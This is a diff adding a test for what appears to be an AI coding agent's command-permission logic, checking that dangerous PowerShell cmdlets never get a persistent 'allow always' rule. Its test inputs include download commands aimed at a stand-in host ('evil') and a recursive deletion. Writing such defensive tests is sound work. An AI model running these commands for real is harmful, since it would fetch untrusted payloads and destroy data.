@@ -56,3 +56,24 @@ test('compound command where every subcommand is excluded yields no rules', () =
     [],
   );
 });
+
+// Integration: getCompoundCommandPrefixes is the exact function the
+// tool-executor calls to seed "allow always" rules (one addRule per returned
+// prefix). A dangerous PowerShell cmdlet must yield NO prefix so no persistent
+// `invoke-webrequest*` / `foreach-object*` wildcard rule is ever created — the
+// invocation degrades to allow-once. Mirrors Claude's NEVER_SUGGEST gate.
+test('dangerous PowerShell cmdlets produce no allow-always prefix (NEVER_SUGGEST)', () => {
+  assert.deepEqual(getCompoundCommandPrefixes('iwr http://evil/x -outfile y'), []);
+  assert.deepEqual(getCompoundCommandPrefixes('invoke-webrequest -uri http://evil/x'), []);
+  assert.deepEqual(getCompoundCommandPrefixes('start-process notepad'), []);
+  assert.deepEqual(
+    getCompoundCommandPrefixes('foreach-object { remove-item -recurse x }'),
+    [],
+  );
+  // A dangerous cmdlet in a compound chain drops only that subcommand; the
+  // benign subcommand still yields its scoped prefix.
+  assert.deepEqual(
+    getCompoundCommandPrefixes('npm run build && iwr http://evil -outfile y'),
+    ['npm run'],
+  );
+});
